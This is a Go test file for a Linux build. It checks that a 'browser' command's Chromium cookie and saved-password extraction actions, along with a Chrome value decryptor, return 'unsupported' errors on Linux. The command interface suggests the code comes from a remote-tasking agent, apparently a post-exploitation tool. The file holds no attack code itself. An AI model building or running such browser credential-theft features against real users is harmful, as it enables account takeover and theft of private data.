//go:build linux

package commands

import (
	"encoding/json"
	"testing"
)

func TestChromeDecryptValue_LinuxStub(t *testing.T) {
	_, err := chromeDecryptValue([]byte("v10test"), nil)
	if err == nil {
		t.Error("expected error from Linux stub")
	}
}

func TestBrowserChromiumCookies_LinuxUnsupported(t *testing.T) {
	args := browserArgs{Browser: "chrome"}
	result := browserChromiumCookies(args)
	assertError(t, result)
	assertOutputContains(t, result, "DPAPI")
}

func TestBrowserChromiumPasswords_LinuxUnsupported(t *testing.T) {
	args := browserArgs{Browser: "all"}
	result := browserChromiumPasswords(args)
	assertError(t, result)
	assertOutputContains(t, result, "Windows")
}

func TestBrowserPasswordsAction_LinuxUnsupported(t *testing.T) {
	cmd := &BrowserCommand{}
	params, _ := json.Marshal(browserArgs{Action: "passwords"})
	result := cmd.Execute(mockTask("browser", string(params)))
	assertError(t, result)
}

func TestBrowserCookiesChromium_LinuxUnsupported(t *testing.T) {
	cmd := &BrowserCommand{}
	params, _ := json.Marshal(browserArgs{Action: "cookies", Browser: "chrome"})
	result := cmd.Execute(mockTask("browser", string(params)))
	assertError(t, result)
}
